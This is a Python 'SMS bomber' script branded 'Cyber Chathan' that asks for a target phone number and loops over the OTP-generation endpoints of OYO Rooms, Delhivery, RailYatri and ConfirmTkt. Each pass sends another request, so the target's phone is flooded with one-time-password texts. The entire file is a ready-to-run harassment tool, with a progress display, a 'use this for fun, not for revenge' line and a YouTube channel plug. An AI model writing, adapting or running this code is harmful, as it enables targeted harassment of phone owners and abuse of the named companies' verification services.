import platform
import os
import time
import random
import urllib.request

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    
                       
print(r"               _                                    _                                                                      ")
print(r"              | |                                  | |                         _         _                                    ")
print(r"   ___   _   _  | |__     ___   _ __         ____  | |____                    | |       | |                      _              ")
print(r"  / __| | | | | | '_ \   / _ \ | '__|       /  __| | |___ )    _____  __   __ | |___    | |____     _____  _    | |_____              ")
print(r" | (__  | |_| | | |_) | |  __/ | |         |  (__  | |   | |  | |  | |\ \ |__| |___|    | |__  |   | |  | |\ \  | |___| |   ")
print(r"  \___|  \__, | |_.__/   \___| |_|          \ ___| |_|   |_|  |_|__|_|\  \    | |___    | |  | |   |_|__|_| \ \ |_|   |_|             ")
print(r"          __/ |                                                               (_____)   |_|  |_|                                ")
print(r"         |___/                                                                                                                 ")
print(r"      cyber chathan "ther is no hacker only coders"                                                                                                                         ")
    
def send(target, counter, delay):
    bombers = {
    "OYO Rooms": "https://www.oyorooms.com/api/pwa/generateotp?phone=",
    "Delhivery": "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=",
    "RailYatri": "https://www.railyatri.in/m/user-web-point?phone_number=",
    "ConfirmTkt": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
    }

    failed= 0
    requested = 0
    success= int(requested) - int(failed)
    bombs = int(counter) + 1

    while success != (int(bombs)):
        banner()
        api = random.choice(list(bombers))

        print("===================CYBER CHATHAN'S BOMBING SYSTEM====================")
        print("                BOMBING in progress, please wait !!               ")
        print("     Please keep your data connection active during bombing !!    ")
        print("=====================================================================")
        print("             Target Number           : ", target)
        print("             Number of Requests Sent : ", requested)
        print("             Successful Requests     : ", success)
        print("             Failed Requests         : ", failed)
        print("             API used to BOMB Target : ", api)
        print("=====================================================================")
        print(".         SUBSCRIBE CYBER KALLAN YOUTUBE CHANNEL FOR MORE         ")
        print("              Use this for fun, not for revenge !!                ")
        print("=====================================================================")

        result_url=str(bombers[api])+target

        try:
            requested = requested + 1
            urllib.request.urlopen(str(result_url))
            success = success + 1
        except (urllib.error.HTTPError, urllib.error.URLError):
            failed = failed + 1
            continue

        time.sleep(float(delay))

banner()
print("")
send(input("Enter Target Number :  "), input("Enter Number of Messages: "), input("Enter Delay time (in seconds): "))
